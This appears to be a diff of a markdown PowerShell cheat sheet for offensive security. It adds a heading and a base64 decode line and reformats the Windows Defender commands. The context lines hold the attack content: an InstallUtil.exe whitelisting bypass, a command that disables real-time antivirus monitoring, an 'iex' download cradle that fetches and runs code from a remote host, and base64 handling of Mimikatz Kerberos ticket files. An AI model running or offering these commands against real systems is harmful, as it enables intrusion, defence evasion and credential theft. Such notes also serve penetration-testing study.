@@ -1,3 +1,5 @@
+
+###  Process
 ```
 powershell get-item function:
 Get-Process | Where-Object {$_.ProcessName –eq "explorer"}
@@ -17,10 +19,8 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```
 ### Antivirus
 ```
-#Check status
-Get-MpComputerStatus
-#Disable
-Set-MpPreference -DisableRealtimeMonitoring $true
+Get-MpComputerStatus #Check status
+Set-MpPreference -DisableRealtimeMonitoring $true #Disable
 ```
 ### User
 ```
@@ -60,4 +60,5 @@ $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0
 ```
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
 [System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi", [System.Convert]::FromBase64String("do"))
+[System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
 ```
